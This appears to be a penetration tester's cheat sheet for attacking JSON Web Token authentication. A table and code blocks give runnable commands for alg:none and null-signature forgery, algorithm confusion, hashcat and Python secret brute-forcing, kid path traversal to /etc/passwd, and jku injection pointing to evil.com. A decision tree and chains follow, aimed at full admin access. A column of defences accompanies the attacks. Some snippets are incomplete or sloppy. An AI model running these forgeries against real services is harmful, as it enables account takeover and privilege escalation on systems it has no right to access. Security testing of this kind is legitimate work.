# JWT ATTACKS — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **alg:none** | JWT in auth header | `jwt_tool "$JWT" -X a` then use result | API accepts unsigned | "invalid signature" |
| **RS→HS Confusion** | RS256 JWT + public key leaked | `jwt.encode(payload, pub_key, 'HS256')` | Forged HS256 accepted | Lib checks expected alg |
| **Weak Secret** | No alg validation | `hashcat -m 16500 jwt.txt rockyou.txt` | Secret cracked | Secret > 128-bit random |
| **Kid Injection** | kid header in JWT | `{"kid":"../../etc/passwd"}` in header | Path traversal via kid | kid validated |
| **Claim Injection** | Sub/role claims | Modify JWT: `{"sub":"admin","role":"admin"}` | Admin access with forged claims | Signature verified |
| **None/Null Signature** | Empty signature | `jwt_tool "$JWT" -X n` | Accepts null signature | Rejects missing sig |
| **Expired Token** | exp claim in past | Use expired JWT as-is | API still accepts | exp validated |
| **Jku Injection** | jku header | `{"jku":"https://evil.com/jwks.json"}` | Server fetches attacker's JWKS | jku whitelist |

## CURL COMMANDS
```bash
# Decode JWT (no secret needed)
jq -R 'split(".") | .[0], .[1] | @base64d | fromjson' <<< "$JWT"

# Regex to find JWTs in traffic
grep -oP 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+' response.txt

# Test alg:none
jwt_tool "$JWT" -X a -o forged_jwt.txt
curl -s /api/admin -H "Authorization: Bearer $(cat forged_jwt.txt)"

# Test weak secret
python3 -c "
import jwt
# Try common secrets
for secret in ['secret', 'password', '123456', 'supersecret']:
    try:
        decoded = jwt.decode('$JWT', secret, algorithms=['HS256'])
        print(f'CRACKED: {secret}')
        print(decoded)
        break
    except:
        pass
"

# Kid path traversal
python3 -c "
import jwt, json
header = {'kid': '../../etc/passwd', 'alg': 'HS256'}
payload = {'sub': 'admin'}
# If server uses kid as file path to get secret
print('Try kid injection with:')
print(json.dumps(header))
"
```

## DECISION TREE
```
Found JWT auth?
├─ Check alg in header
│  ├─ "none"? → Already vulnerable
│  ├─ RS256? → Try HS256 confusion (need public key)
│  └─ HS256? → Try weak secret brute
├─ kid header present?
│  ├─ Yes → Kid injection (path traversal, SQLi, SSRF)
│  └─ No → Move to claim/exp tests
├─ exp claim?
│  ├─ Missing → Token never expires
│  └─ Present → Check if actually validated
└─ Custom claims (role, is_admin)?
   ├─ Modifiable? → Claim injection via forgery
   └─ Verfied? → Good
```

## CHAIN
JWT Forge + IDOR = Access any resource as any user
JWT None + Admin Claim = Full admin access
